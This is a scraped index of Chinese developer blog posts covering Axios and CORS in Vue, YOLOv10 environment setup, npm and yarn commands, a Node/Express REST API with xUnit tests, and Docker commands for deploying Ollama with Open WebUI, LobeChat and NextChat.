path.replace(/^\\/api/, \u0026#39;\u0026#39;), }, }, }, }); 4. 在 Vue 组件中调用 API 使用封装的 Axios：\n\u0026lt;template\u0026gt; \u0026lt;el-table :data=\u0026#34;tableData\u0026#34; style=\u0026#34;width: 100%\u0026#34;\u0026gt; \u0026lt;el-table-column fixed prop=\u0026#34;UserBlackID\u0026#34; label=\u0026#34;UserBlackID\u0026#34; width=\u0026#34;150\u0026#34; /\u0026gt; \u0026lt;el-table-column prop=\u0026#34;UserBlockerID\u0026#34; label=\u0026#34;UserBlockerID\u0026#34; width=\u0026#34;120\u0026#34; /\u0026gt; \u0026lt;el-table-column prop=\u0026#34;UserBlockedID\u0026#34; label=\u0026#34;UserBlockedID\u0026#34; width=\u0026#34;120\u0026#34; /\u0026gt; \u0026lt;el-table-column prop=\u0026#34;CreatedAt\u0026#34; label=\u0026#34;CreatedAt\u0026#34; width=\u0026#34;200\u0026#34; /\u0026gt; \u0026lt;el-table-column prop=\u0026#34;UserBlackReason\u0026#34; label=\u0026#34;Reason\u0026#34; width=\u0026#34;300\u0026#34; /\u0026gt; \u0026lt;el-table-column prop=\u0026#34;UserBlackIP\u0026#34; label=\u0026#34;IP\u0026#34; width=\u0026#34;150\u0026#34; /\u0026gt; \u0026lt;el-table-column prop=\u0026#34;UserBlackStatus\u0026#34; label=\u0026#34;Status\u0026#34; width=\u0026#34;120\u0026#34; /\u0026gt; \u0026lt;/el-table\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script lang=\u0026#34;ts\u0026#34; setup\u0026gt; import { ref, onMounted } from \u0026#39;vue\u0026#39;; import request from \u0026#39;@/http/request\u0026#39;; // 根据你的路径调整 const tableData = ref([]); onMounted(async () =\u0026gt; { try { const response = await request({ url: \u0026#39;/api/zblack/FindUserBlackLLL\u0026#39; }); tableData.value = response; } catch (error) { console.error(\u0026#39;获取数据失败:\u0026#39;, error); } }); \u0026lt;/script\u0026gt; \u0026lt;style scoped lang=\u0026#34;scss\u0026#34;\u0026gt; @import \u0026#39;./index.scss\u0026#39;; \u0026lt;/style\u0026gt; 调用成功则跨域问题 解决~\n什么是Unix时间戳(Unix timestamp)： Unix时间戳(Unix timestamp)，或称Unix时间(Unix time)、POSIX时间(POSIX time)，是一种时间表示方式，定义为从格林威治时间1970年01月01日08时00分00秒起至现在的总秒数。Unix时间戳不仅被使用在Unix 系统、类Unix系统中，也在许多其他操作系统中被广泛采用。 时间戳(timestamp)，通常是一个字符序列，唯一地标识某一刻的时间。数字时间戳技术是数字签名技术一种变种的应用。\n时间戳转化： 第一步：把时间戳转成Date对象(为什么乘以1000，因为1000毫秒换算成秒等于1秒) const date = new Date(1722408384*1000)\n将date进行格式化，转成对应的字符串 （因为时间戳格式化太常见，可以封装，formatData）\nconst formatDate = (timestamp: number) =\u0026gt; { timestamp = timestamp * 1000 const date = new Date(timestamp) console.log(timestamp + \u0026#39;\u0026#39; + date) return `${date.getFullYear()}-${String(date.getMonth() + 1).padStart(2, \u0026#39;0\u0026#39;)}-${String(date.getDate()).padStart( 2,\u0026#39;0\u0026#39;)} ${String(date.getHours()).padStart(2, \u0026#39;0\u0026#39;)}:${String(date.getMinutes()).padStart(2, \u0026#39;0\u0026#39;)}:${String( date.getSeconds() ).padStart(2, \u0026#39;0\u0026#39;)}` } Tooltip Tooltip 的 content 属性是普通字符串，{{ }} 插值语法不会被解析。\n\u0026lt;el-tooltip :content=\u0026#34;\u0026#39;完整：\u0026#39; + scope.row.Content\u0026#34; placement=\u0026#34;top\u0026#34;\u0026gt; \u0026lt;el-tooltip placement=\u0026#34;top\u0026#34;\u0026gt; \u0026lt;template #content\u0026gt; \u0026lt;span\u0026gt;完整：{{ scope.row.Content }}\u0026lt;/span\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;span\u0026gt; {{ scope.row.Content.length \u0026gt; 12 ? scope.row.Content.slice(0, 12) + \u0026#39;...\u0026#39; : scope.row.Content }} \u0026lt;/span\u0026gt; \u0026lt;/el-tooltip\u0026gt; import { ElTooltip } from \u0026#39;element-plus\u0026#39; 如需 tooltip 支持 HTML，可用 raw-content：\n\u0026lt;el-tooltip :content=\u0026#34;\u0026#39;\u0026lt;strong\u0026gt;\u0026#39; + scope.row.Content + \u0026#39;\u0026lt;/strong\u0026gt;\u0026#39;\u0026#34; raw-content /\u0026gt; ","permalink":"https://qfsyso.github.io/posts/axios-cors-timestamp/","summary":"具体步骤 安装 Axios: 使用 Axios 进行 HTTP 请求。\n封装 Axios: 将 Axios 封装成一个模块以便在项目中复用。\n解决跨域问题: 在 vite.config.ts 文件中配置代理以解决跨域问题。\n调用 API: 在 Vue 组件中使用封装的 Axios 进行数据请求和显示。\n安装 Axios 首先，确保你已经安装了 Axios：\nbash Copy Code npm install axios\n封装 Axios 创建一个 http 文件夹并在其中创建一个 request.ts 文件：\nsrc/http/request.ts:\nimport axios from \u0026#39;axios\u0026#39;; const service = axios.create({ baseURL: \u0026#39;http://localhost:16552/api/zblack\u0026#39;, // 根据你的后端API地址调整 timeout: 5000, // 请求超时时间 }); // 请求拦截器 service.interceptors.request.use( config =\u0026gt; { return config; }, error =\u0026gt; { console.","title":"Axios Cors  \u0026\u0026 Timestamp"},{"content":"YOLOv3、YOLov3-Ultralytics和YOLOv3u 概述 本文件概述了三种密切相关的物体检测模型，即YOLOv3、YOLOv3-Ultralytics 和YOLOv3u。 1.YOLOv3:这是\u0026quot;You Only Look Once\u0026quot;(YOLO)物体检测算法的第三个版本。YOLOv3最初由约瑟夫-雷德蒙(Joseph Redmon)开发，通过引入多尺度预测和三种不同大小的检测内核等功能，YOLOv3 对其前身进行了改进。 YOLOv3-Ultralvtics: 这是Ultralvtics\u0026rsquo; YOLov3 模型的实现。它再现了原始的 YOLOv3 架构，并提供了更多的功2. 能，如支持更多的预训练模型和更简单的定制选项。 YOLOv3u:这是 yOLOv3-ultralvtics 的更新版本，它采用了YOLOv8 模型中使用的无锚、无对象性分割头,3. YOLOv3u 保留了与 YOLOv3 相同的骨干和颈部结构，但使用了YOLOv8 更新的检测头。\nYOLov4:高速、精确的物体探测 欢迎访问Ultralytics YoLov4 文档页面，YOLOv4 是由 Alexey Bochkovskiy于 2020,年在https://github.com/AlexeyAB/darknet 推出的最先进的实时物体检测器。 YOLOv4 的设计在速度和精确度之间实现了最佳平衡，是许多应用的理想选择。\nYOLOv5u 代表着物体检测方法的进步。YOLOv5u 源自 开发的 YOLOv5 Ultralvtics 开发的模型的基础结构，YOLOv5u整合了无锚点、无对象性的分割头，这是以前的 YOLov8模型中引入的功能。这一调整完善了模型的架构，从而提高了物体检测任务中的精度·速度权衡。鉴于经验结果及其衍生特征，YOLov5u 为那些在研究和实际应用中寻求稳健解决方案的人提供了一个高效的替代方案。\n美团YOLOv6 是一款先进的物体检测器，在速度和准确性之间取得了出色的平衡，是实时应用的热门选择。该模型在架构和训练方案上引入了几项显著的改进，包括双向串联(Bic)模块、锚点辅助训练(AAT)策略以及改进的骨干和颈部设计，从而在 COCo 数据集上实现了最先进的精度。 Bic AAT\nYOLOv7: 可训练的免费书包 YOLOv7 是最先进的实时物体检测器，在5FPS 到 160 FPS 的范围内，其速度和准确性都超过了所有已知的物体检测器。在GPU V100 上，YOLOv7 的准确率(56.8% AP)在 30 FPS 或更高的所有已知实时物体检测器中是最高的。此外，YOLOv7 在速度和准确性上都优于 YOLOR、YOLOX、Scaled-YOLOv4、YOLOv5 等其他物体检测器。该模型是在 MS COC0 数据集上从头开始训练的，没有使用任何其他数据集或预先训练的权重。YoLov7 的源代码可在GitHub 上获取。\nYOLOv8 YOLOv8 是YOL0 系列实时物体检测器的最新迭代产品，在精度和速度方面都具有尖端性能。在之前YOL0 版本的基础上，YOLov8 引入了新的功能和优化，使其成为广泛应用中各种物体检测任务的理想选择。\nYOLov9:物体检测技术的飞跃发展 YOLov9 引入了可编程梯度信息IPGI) 和广义高效层聚合网络(GELAN) 等开创性技术，标志着实时目标检测领域的重大进步。该模型在效率、准确性和适应性方面都有显著提高，在 MS COC0 数据集上树立了新的标杆。YOLOv9 项目虽然是由一个独立的开源团队开发的，但它建立在以下机构提供的强大代码库基础之上 ultralytics YoLov5提供的强大代码库，展示了人工智能研究界的协作精神。\nYOLO强在目标检测\nYOLOv10:实时端到端物体检测 YOLOv10 是清华大学研究人员在 Ultralvtics Python,清华大学的研究人员在 YOLOv10软件包的基础上，引入了一种新的实时目标检测方法，解决了YOL0 以前版本在后处理和模型架构方面的不足。通过消除非最大抑制(NMS)和优化各种模型组件，YOLOv10 在显著降低计算开销的同时实现了最先进的性能。大量实验证明，YOLOv10 在多个模型尺度上实现了卓越的精度-延迟权衡。 实时物体检测旨在以较低的延迟准确预测图像中的物体类别和位置。YOL0 系列在性能和效率之间取得了平衡，因此一直处于这项研究的前沿。然而，对 NMS的依赖和架构上的低效阻碍了最佳性能的实现。YOLOv10 通过为无NMS 训练引入一致的双重分配和以效率-准确性为导向的整体模型设计策略，解决了这些问题。\n主要功能 1.无 NMS训练 利用一致的双重分配来消除对 NMS 的需求，从而减少推理延迟。 2.整体模型设计:从效率和准确性的角度全面优化各种组件，包括轻量级分类头、空间通道去耦向下采样和等级引导块设计。 3.增强的模型功能:纳入大核卷积和部分自注意模块，在不增加大量计算成本的情况下提高性能。\n无NMS训练 最核心特点\nYOLov10 有多种型号，可满足不同的应用需求: YOLOv10-N:用于资源极其有限环境的纳米版本。 YOLOv10-S:兼顾速度和精度的小型版本。 YOLOv10-M:通用中型版本。 YOLOv10-B:平衡型，宽度增加，精度更高， YOLOv10-L:大型版本，精度更高，但计算资源增加。 YOLOv10-X:超大型版本可实现最高精度和性能。\n通俗易懂的YOLOv10环境构建过程 使用的前提 。NVIDIA GPU:推荐至少是GTX 1060/RTX2060级别或更高: 。CUDA Toolkit版本:建议使用CUDA 10.1或更新版本。 。cuDNN版本:与CUDA版本对应的cuDNN版本， 。NVIDIA驱动程序:推荐使用最新版本的NVIDIA驱动程序，以确保最佳性能和功能支持。\n如果不行就只能CPU训练~\n安装conda环境 1、显卡信息查看 nvidia-smi nv控制版面\n2、下载anaconda3 https://repo.anaconda.com/archive/Anaconda3-2024.06-1-Windows-x86 64.exe https://www.anaconda.com/\n3、配置环境变量 E:\\Application\\anaconda3 E:\\Applicationanaconda3\\Scripts E:\\Application\\anaconda3\\Library\\bin\n系统变量 path\n验证环境是否OK，出现base代表OK，没有出现卸载在安装一次 conda env list 验证简单conda命令 创建python环境\nconda create -n yolov10 python==3.9 2、查看现有环境 conda env list 3、激活环境 conda init conda activate yolo 4、激活失败 conda init cmd.exe 5、删除环境 conda env remove -n yolo10\n配置YOLOv10环境 提示:千万别开加速器，强调N遍，开完加速器可能版本不兼容，环境折腾死人\n下载YOLov10源码 https://github.com/THU-MIG/yolov10\n创建YOLOv10环境 conda create -n yolov10 python==3.9\n激活yolov10环境 conda activate yolov10\n找到源码下的的requirement.txt文档 把torch和torchvision两个注释掉\n手动安装pytorch和tourchvision。 进入pythorch官网找到2.0.1的版本，复制链接后手动安装 pip install torch==2.0.1 torchvision==0.15.2 torchaudio==2.0.2 \u0026ndash;index-url https://download.pytorch.org/whl/cu118 验证是否OK,显示结果为True代表就OK import torch torch.cuda.is available()=== true\n安装成功后，执行 python pip install -r requirements.txt\n编译源码 pip install -e .\n下载预训练权重模型 https://github.com/THU-MIG/yolov10\nhttps://github.com/THU-MIG/yolov10/releases/tag/v1.1\n.pt\nyolov10-main\u0026gt;yolo predict model=yolov10n.pt source=cat.jpg\n标注工具 lablemechinese lableImg\nPS\nPyTorch PyTorch 是一种开源深度学习框架，以出色的灵活性和易用性著称。这在一定程度上是因为与机器学习开发者和数据科学家所青睐的热门 Python 高级编程语言兼容。\n什么是 PyTorch? PvTorch 是一种用于构建深度学习模型的功能完备框架，是一种通常用于图像识别和语言处理等应用程序的机器学习。使用 Python 编写，因此对于大多数机器学习开发者而言，学习和使用起来相对简单。PyTorch 的独特之处在于，它完全支持 GPU，并且使用反向模式自动微分技术，因此可以动态修改计算图形。这使其成为快速实验和原型设计的常用选择。\n为何选择 PyTorch? PyTorch 是 Facebook Al Research 和其他几个实验室的开发者的工作成果。该框架将 Torch 中高效而灵活的 GPU 加谏后端库与直观的 Pvthon 前端相结合，后者专注于快速原型设计、可读代码，并支持尽可能广泛的深度学习模型。Pytorch 支持开发者使用熟悉的命令式编程方法，但仍可以输出到图形。它于 2017 年以开源形式发布，其Python 根源使其深受机器学习开发者的喜爱。 和TensorFlow区别 是 可以动态修改计算图形。灵活性，易用性，深度学习框架。\nTensorFlow TensorFlow 是一款先进的开源库，旨在开发和部署先进的机器学习应用程序。\n什么是 Tensorflow TensorFlow 是数据科学家、软件开发者和教育工作者主要使用的开源平台，用于使用数据流图形进行机器学习。图像中的节点代表数学运算，而图像边缘则代表节点间流动的多维数据阵列(张量)。这种灵活的架构允许将机器学习算法描述为相关运算的图形。可以在便携式设备、台式电脑和高端服务器等众多不同平台的 GPU、CPU 和TPU 上训练和执行这些代码，而无需重写代码。这意味着各种背景的编程人员均可以使用相同的工具集进行协作从而显著提高效率，该系统最初由 Google Brain 团队开发，用于研究机器学习和深度神经网络(DNN)，其通用性同样适用于其他各种领域。 TensorFlow的工作原理 TensorFlow 工作流程由三个不同的部分定义，即数据预处理、构建模型和训练模型，从而进行预测。该框架将数据输入称为张量的多维数组，并以两种不同的方式执行。主要方法是构建一个计算图形来定义用于训练模型的数据流。第二种常用的更直观的方法是使用 Eager Execution，该方法遵循命令编程原则并立即评估操作。 使用 TensorFlow 架构，通常在台式电,脑或数据中心完成训练。这两种情况下，均通过在 GPU 上放置张量来加快处理速度。然后，经过训练的模型可以在一系列平台上运行，从台式电脑到移动设备，然后一直到云端。 TensorFlow 还包含很多支持功能。例如，TensorBoard 允许用户以直观方式监控训练过程、底层计算图形和指标以便调试运行以及评估模型性能。TensorBoard 是 Tensorflow 和 Keras 的统一可视化框架, Keras 是在 TensorFlow 上运行的高级 API。Keras 通过提供用于构建常见用例模型的简化 API，进一步深化TensorFlow 的抽象概念。API 背后的驱动理念是能够在更短的时间内将想法落实为结果。\nTensorFlow 的优势 TensorFlow 可用于开发自然语言处理、图像识别、手写识别以及基于计算的不同模拟(例如偏微分方程)等各种 任务模型。Tensorflow 的主要优势在于其能够跨多个加速平台执行低级运算、自动计算梯度、生产级可扩展性和可互操作的图形导出。通过为 Keras 提供高级 AP!和 Eager Execution，替代 Tensorflow 上的数据流范式，始终可以轻松便捷地编写代码。 作为 Tensorflow 的原始开发者，Google 仍然大力支持该库，并加快其发展速度。例如，Google 创建了一个在线中心，用于共享用户创建的许多不同模型。\nTensorFlow和NVIDIA 图形处理器或 GPU 配备由数千个小型高效核心组成的大规模并行架构，可以同时启动数千个并行线程，能够强力支持计算密集型任务。 CPU MULTIPLE CORES GPU THOUSANDS OF CORES 十年前，研究人员发现 GPU 非常擅长矩阵运算和代数计算，而深度学习就十分依赖于这两种运算。TensorFlow 在新款 NVIDIA Pascal GPU 上的运行速度可提升高达 50%，并且能够顺利跨 GPU 进行扩展。 如今，您训练模型的时间可以从几天缩短到几小时。 TensorFlow 使用优化的 C++ 和 NVIDIA’CUDA·工具包编写，使模型能够在训练和推理时在 GPU 上运行，从而大幅提速。 TensorFlow GPU 支持需要多个驱动和库。为简化安装并避免库冲突，建议利用 GPU 支持的 TensorFlow Docker 镜像。此设置仅需要 NVIDIA GPU 驱动并且安装 NVIDIA Docker。用户可以从预配置了预训练模型和 Tensorflow 库支持的 NGC(NVIDIA GPU Cloud)中提取容器。\n","permalink":"https://qfsyso.github.io/posts/yolov10/","summary":"YOLOv3、YOLov3-Ultralytics和YOLOv3u 概述 本文件概述了三种密切相关的物体检测模型，即YOLOv3、YOLOv3-Ultralytics 和YOLOv3u。 1.YOLOv3:这是\u0026quot;You Only Look Once\u0026quot;(YOLO)物体检测算法的第三个版本。YOLOv3最初由约瑟夫-雷德蒙(Joseph Redmon)开发，通过引入多尺度预测和三种不同大小的检测内核等功能，YOLOv3 对其前身进行了改进。 YOLOv3-Ultralvtics: 这是Ultralvtics\u0026rsquo; YOLov3 模型的实现。它再现了原始的 YOLOv3 架构，并提供了更多的功2. 能，如支持更多的预训练模型和更简单的定制选项。 YOLOv3u:这是 yOLOv3-ultralvtics 的更新版本，它采用了YOLOv8 模型中使用的无锚、无对象性分割头,3. YOLOv3u 保留了与 YOLOv3 相同的骨干和颈部结构，但使用了YOLOv8 更新的检测头。\nYOLov4:高速、精确的物体探测 欢迎访问Ultralytics YoLov4 文档页面，YOLOv4 是由 Alexey Bochkovskiy于 2020,年在https://github.com/AlexeyAB/darknet 推出的最先进的实时物体检测器。 YOLOv4 的设计在速度和精确度之间实现了最佳平衡，是许多应用的理想选择。\nYOLOv5u 代表着物体检测方法的进步。YOLOv5u 源自 开发的 YOLOv5 Ultralvtics 开发的模型的基础结构，YOLOv5u整合了无锚点、无对象性的分割头，这是以前的 YOLov8模型中引入的功能。这一调整完善了模型的架构，从而提高了物体检测任务中的精度·速度权衡。鉴于经验结果及其衍生特征，YOLov5u 为那些在研究和实际应用中寻求稳健解决方案的人提供了一个高效的替代方案。\n美团YOLOv6 是一款先进的物体检测器，在速度和准确性之间取得了出色的平衡，是实时应用的热门选择。该模型在架构和训练方案上引入了几项显著的改进，包括双向串联(Bic)模块、锚点辅助训练(AAT)策略以及改进的骨干和颈部设计，从而在 COCo 数据集上实现了最先进的精度。 Bic AAT\nYOLOv7: 可训练的免费书包 YOLOv7 是最先进的实时物体检测器，在5FPS 到 160 FPS 的范围内，其速度和准确性都超过了所有已知的物体检测器。在GPU V100 上，YOLOv7 的准确率(56.8% AP)在 30 FPS 或更高的所有已知实时物体检测器中是最高的。此外，YOLOv7 在速度和准确性上都优于 YOLOR、YOLOX、Scaled-YOLOv4、YOLOv5 等其他物体检测器。该模型是在 MS COC0 数据集上从头开始训练的，没有使用任何其他数据集或预先训练的权重。YoLov7 的源代码可在GitHub 上获取。","title":"yolov10"},{"content":"vite cretae vue npm yarn npm init vite PN vue3 ts\ncd PN npm install npm run dev or\nnpm install -g yarn yarn yarn dev NPM npm init 初始化某个项目 npm install/link 默认的安装依赖操作 npm install taco --save 安装某个依赖，并且默认保存到package. npm uninstall taco --save 安装某个开发时依赖项目 npm install taco --save-dev 更新某个依赖项目 npm update taco --save安装某个全局依赖项目 npm install taco --global 安装某个全局依赖项目 npm publish/login/1ogout 发布/登录/登出，一系列NPM Registry操作 npm rutest 运行某个命令 YARN yarn init 初始化某个项目 yarn install/link 默认的安装依赖操作 yarn add taco 安装某个依赖，并且默认保存到package. yarn remove taco 安装某个开发时依赖项目 yarn add taco --dev 安装某个开发时依赖项目 yarn upgrade taco 更新某个依赖项目 yarn global add taco 安装某个全局依赖项目 yarn publish/login/1ogout 发布/登录/登出，一系列NPM Registry操作 yarn rutest 运行某个命令 -S等同于\u0026ndash;save，将依赖安装至运行依赖 -D等同于\u0026ndash;save-dev，将依赖安装至开发依赖 -g全局\nyarn add vue-router -S yarn add element-plus -S 按需加载\nyarn add unplugin-vue-components -D package.json 查看 依赖\nmain.ts -\u0026gt; app.vue \u0026lt;script setup lang=\u0026#34;ts\u0026#34;\u0026gt; elementplup doc http://element-plus.org/zh-CN/component/overview.html https://element-plus.org/zh-CN/guide/quickstart.html\n","permalink":"https://qfsyso.github.io/posts/vue-npm-yarn/","summary":"vite cretae vue npm yarn npm init vite PN vue3 ts\ncd PN npm install npm run dev or\nnpm install -g yarn yarn yarn dev NPM npm init 初始化某个项目 npm install/link 默认的安装依赖操作 npm install taco --save 安装某个依赖，并且默认保存到package. npm uninstall taco --save 安装某个开发时依赖项目 npm install taco --save-dev 更新某个依赖项目 npm update taco --save安装某个全局依赖项目 npm install taco --global 安装某个全局依赖项目 npm publish/login/1ogout 发布/登录/登出，一系列NPM Registry操作 npm rutest 运行某个命令 YARN yarn init 初始化某个项目 yarn install/link 默认的安装依赖操作 yarn add taco 安装某个依赖，并且默认保存到package.","title":" VUE npm yarn"},{"content":"node api 下面是一个使用 Node.js 和 Express.js 编写的简单 RESTful API 示例。\n1. 初始化项目 首先，创建一个新的项目目录并进入该目录：\nmkdir myapi cd myapi 然后初始化一个新的 Node.js 项目：\nnpm init -y 2. 安装依赖 安装 Express.js 作为我们的 Web 框架：\nnpm install express 3. 创建主文件 在项目根目录下创建一个名为 index.js 的文件：\ntouch index.js 4. 编写 RESTful API 代码 在 index.js 中编写以下代码：\nconst express = require(\u0026#39;express\u0026#39;); const app = express(); const port = 3000; app.use(express.json()); let items = [ { id: 1, name: \u0026#39;Item 1\u0026#39; }, { id: 2, name: \u0026#39;Item 2\u0026#39; }, { id: 3, name: \u0026#39;Item 3\u0026#39; } ]; // 获取所有项目 app.get(\u0026#39;/items\u0026#39;, (req, res) =\u0026gt; { res.json(items); }); // 获取单个项目 app.get(\u0026#39;/items/:id\u0026#39;, (req, res) =\u0026gt; { const id = parseInt(req.params.id); const item = items.find(i =\u0026gt; i.id === id); if (item) { res.json(item); } else { res.status(404).send(\u0026#39;Item not found\u0026#39;); } }); // 创建新项目 app.post(\u0026#39;/items\u0026#39;, (req, res) =\u0026gt; { const newItem = { id: items.length + 1, name: req.body.name }; items.push(newItem); res.status(201).json(newItem); }); // 更新项目 app.put(\u0026#39;/items/:id\u0026#39;, (req, res) =\u0026gt; { const id = parseInt(req.params.id); const item = items.find(i =\u0026gt; i.id === id); if (item) { item.name = req.body.name; res.json(item); } else { res.status(404).send(\u0026#39;Item not found\u0026#39;); } }); // 删除项目 app.delete(\u0026#39;/items/:id\u0026#39;, (req, res) =\u0026gt; { const id = parseInt(req.params.id); const itemIndex = items.findIndex(i =\u0026gt; i.id === id); if (itemIndex !== -1) { items.splice(itemIndex, 1); res.status(204).send(); } else { res.status(404).send(\u0026#39;Item not found\u0026#39;); } }); app.listen(port, () =\u0026gt; { console.log(`Server is running on http://localhost:${port}`); }); 运行服务器 在终端中运行以下命令来启动服务器： node index.js 现在，服务器应该在 http://localhost:3000 上运行\n以下是 API 端点的简要说明： GET /items - 获取所有项目 GET /items/:id - 获取单个项目 POST /items - 创建新项目 PUT /items/:id - 更新项目 DELETE /items/:id - 删除项目\n单元测试。 1. 创建 C# 项目 首先，创建一个新的 xUnit 测试项目：\ndotnet new xunit -n MyApiTests cd MyApiTests 2. 安装 RestSharp 安装 RestSharp 库，它将用于发送 HTTP 请求：\ndotnet add package RestSharp 3. 编写单元测试 在 MyApiTests 项目中，创建一个名为 ApiTests.cs 的文件，并编写以下代码：\nusing RestSharp; using System.Threading.Tasks; using Xunit; public class ApiTests { private const string BaseUrl = \u0026#34;http://localhost:3000\u0026#34;; [Fact] public async Task Test_GetAllItems() { var client = new RestClient(BaseUrl); var request = new RestRequest(\u0026#34;items\u0026#34;, Method.Get); var response = await client.ExecuteAsync(request); Assert.True(response.IsSuccessful); Assert.Contains(\u0026#34;Item 1\u0026#34;, response.Content); } [Fact] public async Task Test_GetSingleItem() { var client = new RestClient(BaseUrl); var request = new RestRequest(\u0026#34;items/1\u0026#34;, Method.Get); var response = await client.ExecuteAsync(request); Assert.True(response.IsSuccessful); Assert.Contains(\u0026#34;Item 1\u0026#34;, response.Content); } [Fact] public async Task Test_CreateNewItem() { var client = new RestClient(BaseUrl); var request = new RestRequest(\u0026#34;items\u0026#34;, Method.Post); request.AddJsonBody(new { name = \u0026#34;New Item\u0026#34; }); var response = await client.ExecuteAsync(request); Assert.True(response.IsSuccessful); Assert.Contains(\u0026#34;New Item\u0026#34;, response.Content); } [Fact] public async Task Test_UpdateItem() { var client = new RestClient(BaseUrl); var request = new RestRequest(\u0026#34;items/1\u0026#34;, Method.Put); request.AddJsonBody(new { name = \u0026#34;Updated Item\u0026#34; }); var response = await client.ExecuteAsync(request); Assert.True(response.IsSuccessful); Assert.Contains(\u0026#34;Updated Item\u0026#34;, response.Content); } [Fact] public async Task Test_DeleteItem() { var client = new RestClient(BaseUrl); var request = new RestRequest(\u0026#34;items/1\u0026#34;, Method.Delete); var response = await client.ExecuteAsync(request); Assert.True(response.IsSuccessful); } } 运行测试 在终端中运行以下命令来执行测试： dotnet test 执行所有测试，并显示测试结果。\n","permalink":"https://qfsyso.github.io/posts/.net-mstest-xunit/","summary":"node api 下面是一个使用 Node.js 和 Express.js 编写的简单 RESTful API 示例。\n1. 初始化项目 首先，创建一个新的项目目录并进入该目录：\nmkdir myapi cd myapi 然后初始化一个新的 Node.js 项目：\nnpm init -y 2. 安装依赖 安装 Express.js 作为我们的 Web 框架：\nnpm install express 3. 创建主文件 在项目根目录下创建一个名为 index.js 的文件：\ntouch index.js 4. 编写 RESTful API 代码 在 index.js 中编写以下代码：\nconst express = require(\u0026#39;express\u0026#39;); const app = express(); const port = 3000; app.use(express.json()); let items = [ { id: 1, name: \u0026#39;Item 1\u0026#39; }, { id: 2, name: \u0026#39;Item 2\u0026#39; }, { id: 3, name: \u0026#39;Item 3\u0026#39; } ]; // 获取所有项目 app.","title":".NET MSTest Xunit"},{"content":"ollama https://ollama.com/ ollama\nhttps://ollama.com/library models\nollama run qwen2 send a message ollama run gemma2 https://github.com/open-webui/open-webui webui\ndocker run -d -p 3000:8080 --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:main N卡 gpu\ndocker run -d -p 3000:8080 --gpus all --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:cuda http://localhost:3000/\ndeepseek https://ollama.com/library/deepseek-coder-v2 deepseek-coder-v2 ~~ codeqwen sqlcoder\ncurl -X POST http://localhost:11434/api/generate -d \u0026#39;{ \u0026#34;model\u0026#34;: \u0026#34;llama2-chinese:7b-chat-q4_0\u0026#34;, \u0026#34;prompt\u0026#34;:\u0026#34;为什么天空是蓝色的\u0026#34; }\u0026#39; https://docs.openwebui.com/\nOpen WebUI Open WebUI https://docs.openwebui.com/ 安装默认配置\n1.如果计算机上安装了Ollama，可以使用以下命令：\ndocker run -d -p 3000:8080 --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:main 2.如果Ollama在另一台服务器上，请使用以下命令： 连接到另一台服务器上的Ollama时，请将OLLAMA_BASE_URL更改为服务器的URL：\ndocker run -d -p 3000:8080 -e OLLAMA_BASE_URL=https://example.com -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:main docker run -d \\ --name open-webui \\ -p 3000:8080 \\ -e OLLAMA_BASE_URL=http://223.166.100.xxx:5555 \\ --restart unless-stopped \\ ghcr.io/open-webui/open-webui:main 要使用Nvidia GPU支持运行Open WebUI，请使用以下命令：\ndocker run -d -p 3000:8080 --gpus all --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:cuda 3.仅用于OpenAI API使用的安装 如果仅使用OpenAI API，请使用以下命令：\ndocker run -d -p 3000:8080 -e OPENAI_API_KEY=your_secret_key -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:main 4.带有捆绑Ollama支持的Open WebUI安装 此安装方法使用一个单独的容器映像，将Open WebUI与Ollama捆绑在一起，通过单个命令实现简化设置。根据硬件设置选择适当的命令：\n使用GPU支持：通过运行以下命令利用GPU资源\ndocker run -d -p 3000:8080 --gpus=all -v ollama:/root/.ollama -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:ollama 仅CPU：如果不使用GPU，请改用以下命令：\ndocker run -d -p 3000:8080 -v ollama:/root/.ollama -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:ollama 这两个命令都支持内置、简单的安装Open WebUI和Ollama，确保可以快速启动一切。\n安装完成后，可以通过http://localhost:3000访问OpenWebUI。\nNewAPI docker run -d --name newapi -p 3002:3000 -e OLLAMA_BASE_URL=http://51.81.153.xx:8888 calciumion/new-api:latest LobeChat docker run -d --name newapi \\ -p 3001:3000 \\ -e OLLAMA_API_BASE=http://108.187.251.168:11434 \\ calciumion/new-api:latest docker run -d -p 3210:3210 \\ -e OPENAI_API_KEY=你的OpenAI_API_Key \\ -e ACCESS_CODE=你设置的访问密码 \\ --name lobe-chat \\ lobehub/lobe-chat:latest Lobechat-ollama\ndocker run -d -p 3210:3210 \\ -e OLLAMA_PROXY_URL=ollamaapi:11434 \\ --name lobe-chat \\ lobehub/lobe-chat:latest docker run -d -p 3210:3210 \\ -e OLLAMA_PROXY_URL=https://deepseek-32xx.natec.cn \\ --name lobe-chat \\ lobehub/lobe-chat:latest docker run -d -p 3210:3210 lobehub/lobe-chat:latest 填入\nlobe openai key xxx api地址 http://185.242.233.241:3001/v1 lobe ollama 服务地址 https://deepseek-32b.natec.cn/\nNextChat（ChatGPT Docker 一键部署 NextChat（ChatGPT-Next-Web）的步骤： 拉取镜像：执行命令 docker pull yidadaa/chatgpt-next-web 拉取镜像 。 运行容器：使用以下命令运行容器，设置 OPENAI_API_KEY（必填）和 CODE（访问密码，可选）： bash 复制 docker run -d -p 3000:3000 -e OPENAI_API_KEY=sk-xxx -e CODE=页面访问密码 yidadaa/chatgpt-next-web 或者使用 docker-compose.yml 配置： yaml 复制 version: \u0026lsquo;3\u0026rsquo; services: chatgpt-next-web: image: yidadaa/chatgpt-next-web:latest container_name: nextchat restart: always ports: - \u0026ldquo;端口号:3000\u0026rdquo; environment: - OPENAI_API_KEY=你的API Key - CODE=访问密码 - BASE_URL=第三方代理地址（可选） 然后执行 docker-compose up -d 启动服务 。 访问与配置：通过 IP + 端口 访问（默认端口为 3000），首次使用时需在设置中输入访问密码（由 CODE 环境变量设置）\nollama资料： 